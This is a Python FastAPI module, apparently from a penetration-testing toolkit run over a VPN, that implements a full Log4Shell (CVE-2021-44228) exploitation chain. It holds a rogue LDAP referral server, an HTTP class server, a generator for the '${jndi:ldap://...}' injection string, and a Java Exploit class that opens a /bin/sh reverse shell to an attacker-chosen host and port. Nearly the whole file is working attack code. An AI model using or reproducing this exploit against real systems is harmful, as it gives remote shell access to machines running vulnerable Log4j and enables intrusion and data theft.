"""Rogue LDAP referral server + HTTP class server for CVE-2021-44228
(Log4Shell) JNDI exploitation.

When Log4j resolves an attacker-controlled "${jndi:ldap://host:port/name}"
string, the victim JVM connects here. This server answers any bind with
success and any search with a single javaNamingReference entry whose
javaCodeBase points at a small local HTTP server serving a compiled
Exploit.class -- the victim JVM downloads and instantiates that class,
running the reverse-shell payload baked into it at compile time (LHOST/
LPORT are substituted into Exploit.java before javac runs, the same way
ReverseShellPanel bakes them into an nc/socat command).

Unlike marshalsec/JNDIExploit (which this app does not bundle -- no jar,
no separately-downloaded JDK), the LDAP responder here is a self-contained
~100-line BER encoder/decoder. LDAP's wire format for "any bind succeeds,
any search returns one fixed referral entry" is small enough to hand-roll;
reaching for pyasn1's ASN.1 machinery here would only trade a little
boilerplate for the real risk of getting implicit/explicit tagging subtly
wrong. The actual reverse shell is caught by whatever nc/socat listener
the operator already has open via ReverseShellPanel -- this module only
gets the victim to dial out to it.
"""
from __future__ import annotations

import re
import shutil
import socket
import subprocess
import threading
from pathlib import Path

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field

from ..config import DATA_DIR
from .vpn import vpn_status

router = APIRouter(prefix="/api/jndi-listener", tags=["JNDI Listener"])

BUILD_DIR = DATA_DIR / "jndi-listener"
CLASS_NAME = "Exploit"
IP_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}$")

EXPLOIT_TEMPLATE = """\
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host = "%s";
        int port = %d;
        Process p = new ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
        Socket s = new Socket(host, port);
        InputStream pi = p.getInputStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {
            while (pi.available() > 0) so.write(pi.read());
            while (si.available() > 0) po.write(si.read());
            so.flush();
            po.flush();
            try { Thread.sleep(50); } catch (InterruptedException e) {}
            try { p.exitValue(); break; } catch (IllegalThreadStateException e) {}
        }
        p.destroy();
        s.close();
    }
}
"""

# ---- BER encoding helpers (LDAP wire format subset, RFC 4511) -------------

BIND_REQUEST, SEARCH_REQUEST = 0x60, 0x63


def _ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _ber_len(len(value)) + value


def _int_body(n: int) -> bytes:
    length = max(1, (n.bit_length() + 8) // 8)
    return n.to_bytes(length, "big", signed=True)


def _octet_string(value: bytes) -> bytes:
    return _tlv(0x04, value)


def _ldap_result_body() -> bytes:
    return _tlv(0x0A, _int_body(0)) + _octet_string(b"") + _octet_string(b"")


def _wrap_message(message_id: int, op: bytes) -> bytes:
    body = _tlv(0x02, _int_body(message_id)) + op
    return _tlv(0x30, body)


def bind_response(message_id: int) -> bytes:
    return _wrap_message(message_id, _tlv(0x61, _ldap_result_body()))


def _attribute(name: bytes, *values: bytes) -> bytes:
    vals = _tlv(0x31, b"".join(_octet_string(v) for v in values))
    return _tlv(0x30, _octet_string(name) + vals)


def search_result_entry(message_id: int, codebase_url: str) -> bytes:
    attrs = b"".join([
        _attribute(b"javaClassName", CLASS_NAME.encode()),
        _attribute(b"javaCodeBase", codebase_url.encode()),
        _attribute(b"objectClass", b"javaNamingReference"),
        _attribute(b"javaFactory", CLASS_NAME.encode()),
    ])
    op_body = _octet_string(b"") + _tlv(0x30, attrs)
    return _wrap_message(message_id, _tlv(0x64, op_body))


def search_result_done(message_id: int) -> bytes:
    return _wrap_message(message_id, _tlv(0x65, _ldap_result_body()))


def _read_length(data: bytes, pos: int) -> tuple[int, int]:
    first = data[pos]
    pos += 1
    if first & 0x80 == 0:
        return first, pos
    n = first & 0x7F
    return int.from_bytes(data[pos:pos + n], "big"), pos + n


def parse_request(data: bytes) -> tuple[int, int]:
    """(message_id, protocol_op_tag) from one complete LDAPMessage."""
    pos = 1  # outer SEQUENCE tag (0x30)
    _, pos = _read_length(data, pos)
    pos += 1  # INTEGER tag (0x02) for messageID
    int_len, pos = _read_length(data, pos)
    message_id = int.from_bytes(data[pos:pos + int_len], "big", signed=True)
    pos += int_len
    return message_id, data[pos]


def _recv_exact(conn: socket.socket, n: int) -> bytes | None:
    if n == 0:
        return b""
    buf = bytearray()
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return bytes(buf)


def recv_message(conn: socket.socket) -> bytes | None:
    header = _recv_exact(conn, 2)
    if not header:
        return None
    if header[1] & 0x80 == 0:
        length, extra = header[1], b""
    else:
        n = header[1] & 0x7F
        extra = _recv_exact(conn, n)
        if extra is None:
            return None
        length = int.from_bytes(extra, "big")
    value = _recv_exact(conn, length)
    if value is None:
        return None
    return header + extra + value


def handle_connection(conn: socket.socket, codebase_url: str) -> None:
    try:
        while True:
            data = recv_message(conn)
            if not data:
                return
            message_id, op = parse_request(data)
            if op == BIND_REQUEST:
                conn.sendall(bind_response(message_id))
            elif op == SEARCH_REQUEST:
                conn.sendall(search_result_entry(message_id, codebase_url))
                conn.sendall(search_result_done(message_id))
            else:
                return
    except (ConnectionError, OSError, IndexError):
        pass
    finally:
        conn.close()


def serve_ldap(sock: socket.socket, codebase_url: str, stop: threading.Event) -> None:
    sock.settimeout(0.5)
    while not stop.is_set():
        try:
            conn, _ = sock.accept()
        except socket.timeout:
            continue
        except OSError:
            return
        threading.Thread(target=handle_connection, args=(conn, codebase_url),
                          daemon=True).start()


# ---- Exploit.class build ---------------------------------------------------

def javac_available() -> bool:
    return shutil.which("javac") is not None


def compile_exploit(lhost: str, lport: int, build_dir: Path) -> Path:
    build_dir.mkdir(parents=True, exist_ok=True)
    java_path = build_dir / f"{CLASS_NAME}.java"
    java_path.write_text(EXPLOIT_TEMPLATE % (lhost, lport))
    result = subprocess.run(
        ["/usr/bin/javac", "-d", str(build_dir), str(java_path)],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise HTTPException(500, f"Exploit.class 컴파일 실패: {result.stderr.strip()}")
    return build_dir / f"{CLASS_NAME}.class"


def kill_orphaned_http_server() -> None:
    """Best-effort cleanup for the class-server subprocess left running by a
    previous process generation (e.g. uvicorn --reload)."""
    try:
        subprocess.run(["/usr/bin/pkill", "-f", f"--directory {BUILD_DIR}"],
                        capture_output=True, timeout=2)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass


# ---- start/stop/status ------------------------------------------------------

_http_process: subprocess.Popen | None = None
_ldap_socket: socket.socket | None = None
_ldap_stop: threading.Event | None = None
_http_port: int | None = None
_ldap_port: int | None = None
_lhost: str | None = None
_lport: int | None = None


def _free_port(host: str) -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, 0))
        return sock.getsockname()[1]


def _tun0_ip() -> str:
    match = re.search(r"(\d+\.\d+\.\d+\.\d+)/\d+", vpn_status().get("tun0", ""))
    if not match:
        raise HTTPException(409, "tun0가 연결되어 있지 않습니다")
    return match.group(1)


def _running() -> bool:
    return bool(_http_process and _http_process.poll() is None and _ldap_socket is not None)


def _state() -> dict:
    if not _running():
        return {"running": False, "javac_available": javac_available()}
    ip = _tun0_ip()
    return {
        "running": True, "ldap_port": _ldap_port, "http_port": _http_port,
        "lhost": _lhost, "lport": _lport,
        "jndi_payload": f"${{jndi:ldap://{ip}:{_ldap_port}/{CLASS_NAME}}}",
        "javac_available": True,
    }


class JndiListenerStart(BaseModel):
    lhost: str = Field(max_length=64)
    lport: int = Field(ge=1, le=65535)


@router.post("/start")
def start_jndi_listener(body: JndiListenerStart):
    global _http_process, _ldap_socket, _ldap_stop, _http_port, _ldap_port, _lhost, _lport
    if _running():
        return _state()
    if not javac_available():
        raise HTTPException(409, "javac가 설치되어 있지 않습니다 (sudo apt install default-jdk)")
    if not IP_RE.match(body.lhost):
        raise HTTPException(422, "lhost는 IPv4 형식이어야 합니다")
    host = _tun0_ip()

    compile_exploit(body.lhost, body.lport, BUILD_DIR)

    http_port = _free_port(host)
    http_process = subprocess.Popen(
        ["/usr/bin/python3", "-m", "http.server", str(http_port), "--bind", host,
         "--directory", str(BUILD_DIR)],
        start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    ldap_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ldap_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ldap_sock.bind((host, 0))
    ldap_port = ldap_sock.getsockname()[1]
    ldap_sock.listen(5)
    stop_event = threading.Event()
    codebase_url = f"http://{host}:{http_port}/"
    threading.Thread(target=serve_ldap, args=(ldap_sock, codebase_url, stop_event),
                      daemon=True).start()

    _http_process, _ldap_socket, _ldap_stop = http_process, ldap_sock, stop_event
    _http_port, _ldap_port = http_port, ldap_port
    _lhost, _lport = body.lhost, body.lport
    return _state()


@router.post("/stop")
def stop_jndi_listener():
    global _http_process, _ldap_socket, _ldap_stop, _http_port, _ldap_port, _lhost, _lport
    if _http_process and _http_process.poll() is None:
        _http_process.terminate()
        try:
            _http_process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            _http_process.kill()
    if _ldap_stop:
        _ldap_stop.set()
    if _ldap_socket:
        _ldap_socket.close()
    _http_process = _ldap_socket = _ldap_stop = None
    _http_port = _ldap_port = _lhost = _lport = None
    return _state()


@router.get("/status")
def jndi_listener_status():
    return _state()
